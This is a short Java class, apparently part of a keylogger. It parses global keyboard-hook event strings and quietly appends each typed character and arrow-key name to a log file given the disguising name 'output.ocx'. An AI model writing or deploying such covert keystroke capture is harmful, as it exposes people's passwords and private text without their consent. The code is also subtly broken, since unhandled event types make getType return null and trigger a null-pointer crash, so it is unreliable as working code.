package com.sassouki.helper;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class Parse {
	private final int limiter=8;
	private final String NATIVE_KEY_TYPED="NATIVE_KEY_TYPED";
	private final String NATIVE_KEY_RELEASED="NATIVE_KEY_RELEASED";
	private final String NATIVE_KEY_PRESSED="NATIVE_KEY_PRESSED";
	FileOutputStream fout;
	File output = new File("output.ocx");
	public Parse(){
		try {
			fout = new FileOutputStream(output,true);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
 public String process(String str) throws IOException{
	 
	 
	
	 if(getType(str).equals(NATIVE_KEY_TYPED)){
		 String character;
		 int start= str.indexOf("keyChar")+limiter;
		int end = str.indexOf("keyLocation")-1;
		character=str.substring(start,end);
		if(character.length()>2){
			//out(character.charAt(1));
			fout.write(character.charAt(1));
			return String.valueOf(character.charAt(1));
		}
		return "";
	 }else if (getType(str).equals(NATIVE_KEY_RELEASED)){
		 int start=str.indexOf("keyCode")+8;
		 int end=str.indexOf("keyText")-1;
		 
		 if(end>start){
			 String tmp=str.substring(start,end);
			 if(tmp.equals("14")){
				 //fout.write('');  
			 }
			 else if(tmp.equals("57416")){
				 fout.write('U'); fout.write('p'); 
			 } 
			 else if(tmp.equals("57424")){
				 fout.write('D'); fout.write('o'); fout.write('w'); fout.write('n'); 
			 }
			 else if(tmp.equals("57421")){
				 fout.write('R'); fout.write('i'); fout.write('g'); fout.write('h'); fout.write('t'); 
			 } 
			 else if(tmp.equals("57419")){
				 fout.write('L'); fout.write('e'); fout.write('f'); fout.write('t');
			 }
			 return " " + str.substring(start, end)+" ";
		 }

			 return "";
	 }
	 else 
		 return "";
	 
 }
 private String getType(String str){
	 if(str.startsWith(NATIVE_KEY_TYPED)) 
		 return NATIVE_KEY_TYPED;
	 else if (str.startsWith(NATIVE_KEY_RELEASED)) 
		 return NATIVE_KEY_RELEASED;
	 else 
		 return null;
	
	 
 }
 private static void out(Object o){
	 System.out.println(o);
 }
}
